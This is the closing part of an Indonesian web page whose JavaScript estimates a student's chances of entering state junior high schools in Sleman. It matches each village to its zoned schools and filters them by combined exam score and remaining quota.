    "Berbah, Jogotirto": { "jumlah": 7, "id_sekolah": [0, 1, 2, 37, 38, 39, 40] },
    "Berbah, Kalitirto": { "jumlah": 12, "id_sekolah": [0, 1, 2, 6, 7, 8, 17, 18, 19, 20, 37, 40] },
    "Berbah, Sendangtirto": { "jumlah": 5, "id_sekolah": [0, 1, 2, 7, 40] },
    "Berbah, Tegaltirto": { "jumlah": 6, "id_sekolah": [0, 1, 2, 7, 8, 17] },
    "Cangkringan, Argomulyo": { "jumlah": 6, "id_sekolah": [3, 4, 31, 32, 33, 34] },
    "Cangkringan, Glagaharjo": { "jumlah": 4, "id_sekolah": [3, 4, 33, 34] },
    "Cangkringan, Kepuharjo": { "jumlah": 4, "id_sekolah": [3, 4, 33, 34] },
    "Cangkringan, Umbulharjo": { "jumlah": 5, "id_sekolah": [3, 4, 33, 34, 36] },
    "Cangkringan, Wukirsari": { "jumlah": 7, "id_sekolah": [3, 4, 31, 33, 34, 35, 36] },
    "Depok, Caturtunggal": { "jumlah": 6, "id_sekolah": [5, 6, 7, 8, 9, 23] },
    "Depok, Condongcatur": { "jumlah": 9, "id_sekolah": [5, 6, 7, 8, 9, 19, 28, 29, 30] },
    "Depok, Maguwoharjo": { "jumlah": 9, "id_sekolah": [0, 1, 5, 6, 7, 8, 17, 19, 31] },
    "Gamping, Ambarketawang": { "jumlah": 6, "id_sekolah": [10, 11, 12, 13, 15, 16] },
    "Gamping, Balecatur": { "jumlah": 5, "id_sekolah": [10, 12, 13, 14, 16] },
    "Gamping, Banyuraden": { "jumlah": 6, "id_sekolah": [10, 11, 12, 13, 15, 16] },
    "Gamping, Nogotirto": { "jumlah": 7, "id_sekolah": [10, 11, 12, 13, 15, 16, 24] },
    "Gamping, Trihanggo": { "jumlah": 6, "id_sekolah": [11, 12, 22, 23, 24, 45] },
    "Godean, Sidoagung": { "jumlah": 5, "id_sekolah": [14, 15, 16, 25, 41] },
    "Godean, Sidoarum": { "jumlah": 8, "id_sekolah": [10, 11, 12, 13, 14, 15, 16, 25] },
    "Godean, Sidokarto": { "jumlah": 8, "id_sekolah": [10, 11, 12, 13, 14, 15, 16, 25] },
    "Godean, Sidoluhur": { "jumlah": 5, "id_sekolah": [14, 15, 16, 25, 26] },
    "Godean, Sidomoyo": { "jumlah": 7, "id_sekolah": [11, 12, 14, 15, 16, 22, 24] },
    "Godean, Sidomulyo": { "jumlah": 6, "id_sekolah": [10, 13, 14, 15, 16, 25] },
    "Godean, Sidorejo": { "jumlah": 7, "id_sekolah": [14, 15, 16, 21, 25, 26, 41] },
    "Kalasan, Purwomartani": { "jumlah": 10, "id_sekolah": [0, 1, 6, 7, 8, 17, 18, 19, 20, 32] },
    "Kalasan, Selomartani": { "jumlah": 6, "id_sekolah": [17, 18, 19, 20, 31, 32] },
    "Kalasan, Tamanmartani": { "jumlah": 9, "id_sekolah": [0, 17, 18, 19, 20, 32, 37, 39, 40] },
    "Kalasan, Tirtomartani": { "jumlah": 8, "id_sekolah": [0, 17, 18, 19, 20, 32, 37, 40] },
    "Minggir, Sendangagung": { "jumlah": 6, "id_sekolah": [14, 21, 25, 26, 41, 49] },
    "Minggir, Sendangarum": { "jumlah": 4, "id_sekolah": [14, 21, 25, 26] },
    "Minggir, Sendangmulyo": { "jumlah": 5, "id_sekolah": [14, 21, 25, 26, 41] },
    "Minggir, Sendangrejo": { "jumlah": 5, "id_sekolah": [14, 21, 26, 41, 49] },
    "Minggir, Sendangsari": { "jumlah": 4, "id_sekolah": [14, 21, 41, 49] },
    "Mlati, Sendangadi": { "jumlah": 11, "id_sekolah": [11, 22, 23, 24, 27, 30, 43, 44, 45, 46, 47] },
    "Mlati, Sinduadi": { "jumlah": 7, "id_sekolah": [5, 9, 11, 22, 23, 24, 45] },
    "Mlati, Sumberadi": { "jumlah": 8, "id_sekolah": [22, 23, 24, 41, 43, 44, 45, 46] },
    "Mlati, Tirtoadi": { "jumlah": 8, "id_sekolah": [11, 12, 15, 22, 23, 24, 41, 44] },
    "Mlati, Tlogoadi": { "jumlah": 7, "id_sekolah": [11, 12, 22, 23, 24, 44, 45] },
    "Moyudan, Sumberagung": { "jumlah": 5, "id_sekolah": [14, 16, 21, 25, 26] },
    "Moyudan, Sumberarum": { "jumlah": 5, "id_sekolah": [14, 15, 21, 25, 26] },
    "Moyudan, Sumberrahayu": { "jumlah": 4, "id_sekolah": [14, 21, 25, 26] },
    "Moyudan, Sumbersari": { "jumlah": 4, "id_sekolah": [14, 16, 25, 26] },
    "Ngaglik, Donoharjo": { "jumlah": 11, "id_sekolah": [27, 28, 29, 30, 35, 36, 45, 46, 47, 52, 53] },
    "Ngaglik, Minomartani": { "jumlah": 9, "id_sekolah": [5, 6, 7, 8, 9, 28, 29, 30, 36] },
    "Ngaglik, Sardonoharjo": { "jumlah": 9, "id_sekolah": [9, 27, 28, 29, 30, 35, 36, 45, 53] },
    "Ngaglik, Sariharjo": { "jumlah": 11, "id_sekolah": [5, 9, 23, 27, 28, 29, 30, 43, 45, 46, 47] },
    "Ngaglik, Sinduharjo": { "jumlah": 9, "id_sekolah": [5, 6, 9, 23, 27, 28, 29, 30, 36] },
    "Ngaglik, Sukoharjo": { "jumlah": 9, "id_sekolah": [9, 27, 28, 29, 31, 32, 33, 35, 36] },
    "Ngemplak, Bimomartani": { "jumlah": 6, "id_sekolah": [3, 4, 18, 20, 31, 32] },
    "Ngemplak, Sindumartani": { "jumlah": 5, "id_sekolah": [3, 4, 20, 31, 32] },
    "Ngemplak, Umbulmartani": { "jumlah": 10, "id_sekolah": [3, 28, 29, 31, 32, 33, 34, 35, 36, 53] },
    "Ngemplak, Wedomartani": { "jumlah": 10, "id_sekolah": [5, 6, 7, 8, 18, 19, 28, 29, 31, 32, 36] },
    "Ngemplak, Widodomartani": { "jumlah": 6, "id_sekolah": [3, 18, 31, 32, 35, 36] },
    "Pakem, Candibinangun": { "jumlah": 9, "id_sekolah": [27, 28, 30, 33, 34, 35, 36, 52, 53] },
    "Pakem, Hargobinangun": { "jumlah": 6, "id_sekolah": [4, 33, 34, 35, 36, 53] },
    "Pakem, Harjobinangun": { "jumlah": 8, "id_sekolah": [28, 29, 33, 34, 35, 36, 52, 53] },
    "Pakem, Pakembinangun": { "jumlah": 8, "id_sekolah": [3, 4, 29, 33, 34, 35, 36, 53] },
    "Pakem, Purwobinangun": { "jumlah": 9, "id_sekolah": [27, 29, 33, 34, 35, 36, 52, 53] },
    "Prambanan, Bokoharjo": { "jumlah": 7, "id_sekolah": [17, 20, 37, 38, 39, 40] },
    "Prambanan, Gayamharjo": { "jumlah": 4, "id_sekolah": [37, 38, 39, 40] },
    "Prambanan, Madurejo": { "jumlah": 9, "id_sekolah": [0, 1, 2, 17, 20, 37, 38, 39, 40] },
    "Prambanan, Sambirejo": { "jumlah": 4, "id_sekolah": [37, 38, 39, 40] },
    "Prambanan, Sumberharjo": { "jumlah": 7, "id_sekolah": [1, 2, 17, 37, 38, 39, 40] },
    "Prambanan, Wukirharjo": { "jumlah": 4, "id_sekolah": [37, 38, 39, 40] },
    "Seyegan, Margoagung": { "jumlah": 5, "id_sekolah": [41, 44, 48, 49, 50] },
    "Seyegan, Margodadi": { "jumlah": 5, "id_sekolah": [14, 15, 22, 41, 49] },
    "Seyegan, Margokaton": { "jumlah": 5, "id_sekolah": [14, 21, 22, 41, 49] },
    "Seyegan, Margoluwih": { "jumlah": 5, "id_sekolah": [14, 15, 16, 22, 41] },
    "Seyegan, Margomulyo": { "jumlah": 5, "id_sekolah": [22, 24, 41, 44, 49] },
    "Sleman, Caturharjo": { "jumlah": 11, "id_sekolah": [41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53] },
    "Sleman, Pandowoharjo": { "jumlah": 9, "id_sekolah": [27, 29, 30, 43, 44, 45, 46, 47, 48] },
    "Sleman, Tridadi": { "jumlah": 9, "id_sekolah": [22, 23, 24, 27, 43, 44, 45, 46, 47] },
    "Sleman, Triharjo": { "jumlah": 8, "id_sekolah": [43, 44, 45, 46, 48, 50, 51, 53] },
    "Sleman, Trimulyo": { "jumlah": 11, "id_sekolah": [27, 43, 44, 45, 46, 47, 48, 51, 52, 53] },
    "Tempel, Banyurejo": { "jumlah": 4, "id_sekolah": [21, 48, 49, 50] },
    "Tempel, Lumbungrejo": { "jumlah": 4, "id_sekolah": [48, 50, 51, 53] },
    "Tempel, Margorejo": { "jumlah": 8, "id_sekolah": [43, 44, 46, 48, 50, 51, 52, 53] },
    "Tempel, Merdikorejo": { "jumlah": 4, "id_sekolah": [48, 51, 52, 53] },
    "Tempel, Mororejo": { "jumlah": 5, "id_sekolah": [43, 44, 48, 50, 51] },
    "Tempel, Pondokrejo": { "jumlah": 4, "id_sekolah": [48, 49, 50, 51] },
    "Tempel, Sumberrejo": { "jumlah": 4, "id_sekolah": [43, 48, 49, 50] },
    "Tempel, Tambakrejo": { "jumlah": 4, "id_sekolah": [41, 48, 49, 50] },
    "Turi, Bangunkerto": { "jumlah": 7, "id_sekolah": [43, 44, 46, 48, 51, 52, 53] },
    "Turi, Donokerto": { "jumlah": 13, "id_sekolah": [27, 30, 33, 34, 35, 36, 43, 44, 46, 47, 51, 52, 53] },
    "Turi, Girikerto": { "jumlah": 3, "id_sekolah": [34, 52, 53] },
    "Turi, Wonokerto": { "jumlah": 3, "id_sekolah": [51, 52, 53] }
  }

 
 /////
  
  
  
  
  
};

//// ==== GENERATE Dropdown Wilayah ====
function generateWilayahOptions() {
  const select = document.getElementById('wilayah');
  select.innerHTML = '<option value="">Pilih Kecamatan, Kelurahan ...</option>';
  const keys = Object.keys(wilayahData.data_per_wilayah);
  for (const key of keys) {
    const jml = wilayahData.data_per_wilayah[key].jumlah;
    select.innerHTML += `<option value="${key}">${key.replace(",", " | ")} (${jml} sekolah)</option>`;
  }
}

//// ==== Handler Asal KK ====
function handleKkChange() {
  const asalKk = document.getElementById('asal_kk').value;
  const divWil = document.getElementById('pilihan-wilayah');
  if (asalKk === "sleman") {
    divWil.classList.remove('hidden');
    generateWilayahOptions();
  } else {
    divWil.classList.add('hidden');
  }
  document.getElementById('output').innerHTML = "Silakan lengkapi semua input, lalu klik <b>Cek Peluang Sekolah Negeri</b>.";
}

//// ==== CEK PELUANG ====
function cekPeluang() {
  const asalKk = document.getElementById('asal_kk').value;
  let ng = parseFloat(document.getElementById('ng_input').value);
  if (isNaN(ng) || ng <= 0) {
    document.getElementById('output').innerHTML = '<b>Masukkan Nilai Gabungan (NG) Anda!</b>';
    return;
  }
  if (asalKk === '') {
    document.getElementById('output').innerHTML = '<b>Asal KK belum dipilih.</b>';
    return;
  }

  let outputHTML = "";

  if (asalKk === "luar") {
    // KK Luar hanya japres
    const sekolahLayak = dataSekolah
      .filter(skl =>
        ng >= skl.pred_prestasi && skl.japres_nik_luar > 0
      )
      .sort((a, b) => b.pred_prestasi - a.pred_prestasi)
      .slice(0, 6);

    outputHTML += `<br><br><h3>Jalur Prestasi (Untuk KK Luar Sleman)</h3>`;
    if (sekolahLayak.length === 0) {
      outputHTML += "Maaf, untuk Nilai Gabungan <b>"+ng.toFixed(2)+"</b> tidak ada peluang masuk SMPN pada jalur prestasi (alokasi & prediksi terlalu tinggi).";
    } else {
      outputHTML += `Dengan NG <b>${ng.toFixed(2)}</b>, peluang terbesar di:<hr><ol>`;
      sekolahLayak.forEach(skl => {
        outputHTML += `<li>${skl.nama_sekolah}: Prediksi minimal NG japres ${skl.pred_prestasi}, Kuota japres luar: ${skl.japres_nik_luar}</li>`;
      });
      outputHTML += "</ol><small>Catatan: Kuota jalur japres untuk NIK luar Sleman sangat terbatas.<br>Pilih sesuai minat & urutan pilihan!</small>";

      outputHTML += `<br><br><small>Rekomendasi urutan diurutkan dari prediksi passing grade tertinggi (favorit dulu). <br><br><br><br><br><br>Masa depan tidak hanya dipengaruhi oleh adanya sekolah negeri. Masih banyak jalan lain untuk meraih masa depan yang cerah. Semoga Allah menerangi pikiran dan hati anda agar dapat memilih sekolah yang tepat untuk ananda. Semoga Allah Yang Maha Kuasa merestui pilihan sekolah yang anda pilih dan ananda dapat diterima di sekolah pilihannya. Amin.</small>`;

      
    }
    document.getElementById('output').innerHTML = outputHTML;
  }

  if (asalKk === "sleman") {
    // KK Sleman: LENGKAPI pilih kecamatan+kelurahan
    const wilayah = document.getElementById('wilayah').value;
    if (wilayah === '') {
      document.getElementById('output').innerHTML = "<b>Pilih kombinasi Kecamatan, Kelurahan sesuai KK!</b>";
      return;
    }
    // Cari list sekolah di wilayah itu:
    const idxList = wilayahData.data_per_wilayah[wilayah].id_sekolah;
    // Ambil nama sekolah
    const sekolahDiWilayah = idxList.map(idx => dataSekolah[idx]).filter(skl => skl); // filter null jika index out of dataSekolah range

    // --- Cari peluang domwil dan japres
    // 1. Peluang domisil wilayah
    const sekolahDomwil = sekolahDiWilayah
      .filter(skl => ng >= skl.pred_wilayah && skl.sisa_domwil > 0)
      .sort((a,b) => b.pred_wilayah - a.pred_wilayah)
      .slice(0,6);

    // 2. Peluang jalur prestasi (khusus sleman)
    const sekolahJapres = sekolahDiWilayah
      .filter(skl => ng >= skl.pred_prestasi && skl.japres_nik_sleman > 0)
      .sort((a,b) => b.pred_prestasi - a.pred_prestasi)
      .slice(0,6);

    outputHTML += `<br><br><h3>Rekomendasi SMP Negeri Zona Alamat KK Anda</h3>`;
    outputHTML += `<b>Kecamatan, Kelurahan:</b> ${wilayah.replace(",", " | ")}<br>`;
    outputHTML += `<b>Nilai Gabungan (NG):</b> ${ng.toFixed(2)}<hr>`;

    // DOMWIL
    outputHTML += `<br><br><u>Jalur Domisili Wilayah (Zonasi):</u>`;
    if (sekolahDomwil.length === 0) {
      outputHTML += `<br><span style="color:red;">Tidak ada peluang SMPN di jalur domisi wilayah (NG terlalu rendah atau tidak ada sisa kursi).</span>`;
    } else {
      outputHTML += "<ol>";
      sekolahDomwil.forEach(skl => {
        outputHTML += `<li>${skl.nama_sekolah}: Prediksi minimal domwil ${skl.pred_wilayah}, Kuota wilayah: ${skl.sisa_domwil}</li>`;
      });
      outputHTML += "</ol>";
    }

    // JAPRES Sleman
    outputHTML += `<br><br><u>Jalur Prestasi (KK Sleman):</u>`;
    if (sekolahJapres.length === 0) {
      outputHTML += `<br><span style="color:red;">Tidak ada peluang SMPN jalur prestasi (NG terlalu rendah atau kuota habis).</span>`;
    } else {
      outputHTML += "<ol>";
      sekolahJapres.forEach(skl => {
        outputHTML += `<li>${skl.nama_sekolah}: Prediksi minimal NG japres ${skl.pred_prestasi}, Kuota japres Sleman: ${skl.japres_nik_sleman}</li>`;
      });
      outputHTML += "</ol>";
    }
    outputHTML += `<br><small>Rekomendasi urutan diurutkan dari prediksi passing grade tertinggi (favorit dulu). <br><br><br><br><br><br>Masa depan tidak hanya dipengaruhi oleh adanya sekolah negeri. Masih banyak jalan lain untuk meraih masa depan yang cerah. Semoga Allah menerangi pikiran dan hati anda agar dapat memilih sekolah yang tepat untuk ananda. Semoga Allah Yang Maha Kuasa merestui pilihan sekolah yang anda pilih dan ananda dapat diterima di sekolah pilihannya. Amin.</small>`;

    document.getElementById('output').innerHTML = outputHTML;
  }
}



//// ==== Reset Form ====
function resetForm(){
  document.getElementById('form-kk-ng').reset();
  document.getElementById('pilihan-wilayah').classList.add('hidden');
  document.getElementById('output').innerHTML = "Silakan lengkapi semua input, lalu klik <b>Cek Peluang Sekolah Negeri</b>.";
}
</script>


<script>
let menuTimeout = null;

// Tampilkan menu & mulai auto hide
function showMenu() {
  const menu = document.getElementById("nav-links");
  menu.classList.add("show");
  startMenuAutoHide();
}

// Sembunyikan menu & stop timer auto hide
function hideMenu() {
  const menu = document.getElementById("nav-links");
  menu.classList.remove("show");
  clearTimeout(menuTimeout);
}

// Toggle menu: tampil/sembunyi on click burger
function toggleMenu() {
  const menu = document.getElementById("nav-links");
  if (menu.classList.contains("show")) {
    hideMenu();
  } else {
    showMenu();
  }
}

// Mulai timer auto hide (5 detik)
function startMenuAutoHide() {
  clearTimeout(menuTimeout);
  menuTimeout = setTimeout(() => {
    hideMenu();
  }, 5000);
}

// Tutup menu jika klik di luar menu & burger
document.addEventListener("click", function (event) {
  const menu = document.getElementById("nav-links");
  const toggle = document.querySelector(".menu-toggle");
  if (
    menu.classList.contains("show") &&
    !menu.contains(event.target) &&
    !toggle.contains(event.target)
  ) {
    hideMenu();
  }
});

// Tutup menu otomatis saat klik salah satu link di menu
document.querySelectorAll("#nav-links a").forEach(link => {
  link.addEventListener("click", () => {
    hideMenu();
  });
});
</script>
  
</body>
</html>
